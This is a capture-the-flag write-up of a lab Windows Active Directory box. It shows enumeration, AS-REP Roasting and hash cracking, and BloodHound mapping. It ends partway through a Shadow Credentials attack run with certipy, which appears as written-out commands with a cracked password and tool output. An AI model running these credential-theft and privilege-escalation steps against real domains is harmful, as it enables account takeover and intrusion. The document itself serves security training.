---
title: HackSmarter - ShadowGate
date: 2026-06-29
image: cover.png
tags: [HackSmarter, Easy, Windows, Active Directory]
excerpt: An easy Active Directory box that enumerates users over anonymous RPC, gains a foothold through AS-REP Roasting and offline cracking, abuses a GenericWrite edge with a Shadow Credentials attack to take over a second account, and chains AD CS ESC8 to compromise the domain controller and DCSync the krbtgt hash.
---

# ShadowGate

### NMAP Scanning

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-29 08:58:52Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:   5d22:4c5c:3d19:1ae9:d19a:2cf8:345d:14f6
| SHA-1: 2db8:b2b4:3549:bb0d:519f:1e00:845d:0531:b9fe:3390
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:   5d22:4c5c:3d19:1ae9:d19a:2cf8:345d:14f6
| SHA-1: 2db8:b2b4:3549:bb0d:519f:1e00:845d:0531:b9fe:3390
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:   5d22:4c5c:3d19:1ae9:d19a:2cf8:345d:14f6
| SHA-1: 2db8:b2b4:3549:bb0d:519f:1e00:845d:0531:b9fe:3390
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:   5d22:4c5c:3d19:1ae9:d19a:2cf8:345d:14f6
| SHA-1: 2db8:b2b4:3549:bb0d:519f:1e00:845d:0531:b9fe:3390
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   DNS_Tree_Name: shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-29T08:59:49+00:00
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Issuer: commonName=DC01.shadow.gate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-28T08:47:17
| Not valid after:  2026-12-28T08:47:17
| MD5:   e899:57bd:9c5f:3950:2ef3:091e:a5fe:a7b6
| SHA-1: 4abb:cbda:67ef:547c:5e59:d277:0526:985f:901e:d40c
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQR4D+uAz5TKhMhvbHSDr5NTANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMB4XDTI2MDYyODA4NDcxN1oXDTI2
| MTIyODA4NDcxN1owGzEZMBcGA1UEAxMQREMwMS5zaGFkb3cuZ2F0ZTCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAJV4domtkmkgHQQafJPalOGA6Tt9GwYn
| 0/psO9E/v7cQJt7nZ3MLkiVX3omZuK7e2o5kvLCbrSmjj133nVR77Czn3JWJjlas
| jNrKsmopBAB6Iep4UUfnMKVHj95ftUhH+dN+qePzDMfi2DvSp7Viit4s8JrYC5FO
| z0u+F9wsWvQQDiqzLLF0YUb69AyobvBtTJIegpTvT6U5vEzz168HAVNvtYzkr3B6
| JthzcoPpbaryNdFuvrahrvV53pkRUxOTpbuynby3IhHgfRSSruMbIy/yzRKT012Z
| xgo3nUmq9khjy2RbjY/LzhrJi2uhB82iDb3XGDDZQUDp8lQbS6F0LeECAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQBDRldg74Le6G6xCch53iZ3gL4xuf0uNymNhTW88qNaujXk14wcII2I
| XPnsGTK5ogcs5QIRQKOQD9wKeuSo8nRbblPGVarEXt+ttFkkH/Z4++pw+ahWiOpo
| AI/d8MaZSbxzgozVNYNnT8zWlrk/hHi0PtdymnwNn6juteEF3nGVNGpd2xWu9T1m
| aBY7lVMFo4RE1g+PqfVZGgCzOdj2266kPR+thdmDA+HJFXplGlCghE5vvy/H6BrJ
| 16ZU++clPPEKMDT3DcBmgPtwneAJDrNyzPHskU02ny9IzKQGk71sGnNuan9E0kFF
| oae+wcS63J7HspbC7bpw2SolccOCODzk
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-29T09:00:28+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
60470/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
60471/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
60483/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
60497/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
60514/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63823/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2026-06-29T08:59:50
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 54541/tcp): CLEAN (Timeout)
|   Check 2 (port 47862/tcp): CLEAN (Timeout)
|   Check 3 (port 44722/udp): CLEAN (Timeout)
|   Check 4 (port 28472/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

### RPC Enumeration

Connecting to RPC with NULL authentication succeeds and exposes the domain users along with their description fields: `rpcclient -U "" -N 10.0.22.135`

{% image %}

The description fields hold nothing useful. Extracting only the usernames into a file for the attacks that follow:

```bash
➜  shadowgate cat rpc_users.txt | awk '{print $1}' | cut -d ':' -f 2 | tr -d '[' | tr -d ']'
Administrator
Guest
krbtgt
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
```

### SMB - Guest & NULL Authentication

{% image2 %}

Neither Guest nor NULL authentication is accepted over SMB on this host. Mapping the domain and hostname into `/etc/hosts`:

```bash
10.0.22.135	DC01.shadow.gate shadow.gate
```

A notable detail in the NMAP scan is the certificate common name `shadow-DC01-CA`, a strong indicator that Active Directory Certificate Services is deployed on this domain controller:

{% image3 %}

Validating this by browsing to the AD CS web enrollment endpoint at `/certsrv`:

{% image4 %}

The endpoint responds with an authentication prompt, confirming the web enrollment service is live.

### LDAP Enumeration

Starting with the naming contexts:

```bash
➜  shadowgate ldapsearch -x -H ldap://10.0.22.135 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=shadow,DC=gate
namingcontexts: CN=Configuration,DC=shadow,DC=gate
namingcontexts: CN=Schema,CN=Configuration,DC=shadow,DC=gate
namingcontexts: DC=DomainDnsZones,DC=shadow,DC=gate
namingcontexts: DC=ForestDnsZones,DC=shadow,DC=gate

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Any query beyond the base naming contexts returns an error demanding a successful bind, which confirms that anonymous LDAP access is restricted and valid credentials are required to enumerate further:

{% image5 %}

### AS-REP Roasting

With only a list of usernames available, AS-REP Roasting is the natural first attempt. The attack targets accounts that have Kerberos pre-authentication disabled, since the KDC will return an encrypted AS-REP for them that can be cracked offline. Running it with `impacket-GetNPUsers`:

{% image6 %}

Cracking the recovered hash with `john`:

{% image7 %}

A valid AS-REP roastable account also opens the door to Kerberoasting without pre-authentication, requesting service tickets for any SPN-bearing account in a single pass:

```bash
impacket-GetUserSPNs -no-preauth 'jtrueblood' -usersfile ./domain_users.txt -dc-host DC01.shadow.gate shadow.gate/
```

{% image8 %}

The only ticket returned belongs to `krbtgt`, whose hash is not crackable. Confirming the cracked credentials for `jtrueblood` and assessing the access they provide:

{% image9 %}

The credentials are valid and grant read access to several shares, including the AD CS share.

### Active Directory - Domain Reconnaissance

With a valid set of credentials in hand, the domain can be mapped using `rusthound-ce`:

```bash
rusthound --domain shadow.gate --ldapusername 'jtrueblood' --ldappassword 'blood_brothers' --ldapfqdn DC01.shadow.gate --name-server 10.0.22.135 --collectionmethod All --zip
```

{% image10 %}

While the data imports into BloodHound, `bloodyAD` provides a quick check for any WRITE permissions this account holds over other objects:

{% image11 %}

The output reveals two WRITE permissions over two users that belong to the same groups. Once BloodHound finishes analyzing, these should surface as ACL edges in the graph:

{% image12 %}

As predicted, a `GenericWrite` edge over the user `BBROWN` appears. This edge can be abused with a Shadow Credentials attack, which writes a key credential into the target's `msDS-KeyCredentialLink` attribute and then uses the attacker-controlled certificate to request a TGT and recover the account's NT hash:

```bash
➜  shadowgate certipy-ad shadow auto -account 'bbrown' -dc-ip 10.0.22.135 -dc-host DC01.shadow.gate -u jtrueblood@shadow.gate -p 'blood_brothers'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'bbrown'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e3c236952eb14c6d8625100ae9b2b8ea'
[*] Adding Key Credential with device ID 'e3c236952eb14c6d8625100ae9b2b8ea' to the Key Credentials for 'bbrown'
[*] Successfully added Key Credential with device ID 'e3c236952eb14c6d8625100ae9b2b8ea' to the Key Credentials for 'bbrown'
/usr/lib/python3/dist-packages/certipy/lib/certificate.py:519: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'bbrown' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bbrown@shadow.gate'
